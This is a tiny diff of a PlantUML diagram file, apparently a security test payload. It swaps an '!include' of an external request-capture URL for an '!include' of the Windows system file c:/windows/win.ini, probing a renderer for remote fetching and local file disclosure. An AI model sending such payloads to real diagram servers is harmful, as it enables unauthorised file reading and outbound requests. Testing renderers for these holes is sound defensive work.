@@ -1,6 +1,6 @@
-@startuml
+@startuml 
 [Component] as C
-note bottom of C
-!include https://xxxxz.free.beeceptor.com
+note bottom of C   
+!include c:/windows/win.ini
 end note
 @enduml
